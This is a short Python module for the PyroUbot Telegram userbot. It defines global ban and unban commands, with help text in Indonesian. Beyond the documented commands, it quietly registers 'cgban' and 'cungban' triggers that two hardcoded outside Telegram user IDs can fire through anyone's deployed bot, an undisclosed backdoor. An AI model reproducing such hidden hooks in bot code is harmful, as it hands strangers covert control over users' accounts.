from PyroUbot import *

__MODULE__ = "global"
__HELP__ = """
<b>◖ʙᴀɴᴛᴜᴀɴ ᴜɴᴛᴜᴋ ɢʟᴏʙᴀʟ◗</b>

  <b>❑ ᴄᴍᴅ:</b> <code>{0}gban</ᴄᴏᴅᴇ> [ᴜsᴇʀ_ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ]
  <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ 

  <b>❑ ᴄᴍᴅ:</b> <code>{0}ungban</code> [ᴜsᴇʀ_ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ]
  <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴜɴʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
"""

@PY.UBOT("gban", sudo=True)
@PY.TOP_CMD
@ubot.on_message(
    filters.command(["cgban"], ".") & filters.user([1948147616, 1819269848]))
async def _(client, message):
    await global_banned(client, message)

@PY.UBOT("xgban", FILTERS.OWNER)
async def _(client, message):
    await global_banned(client, message)

@ubot.on_message(
    filters.command(["cungban"], ".") & filters.user([1948147616, 1819269848]))
@PY.UBOT("ungban", sudo=True)
@PY.TOP_CMD
async def _(client, message):
    await global_unbanned(client, message)

@PY.UBOT("xungban", FILTERS.OWNER)
async def _(client, message):
    await global_unbanned(client, message)
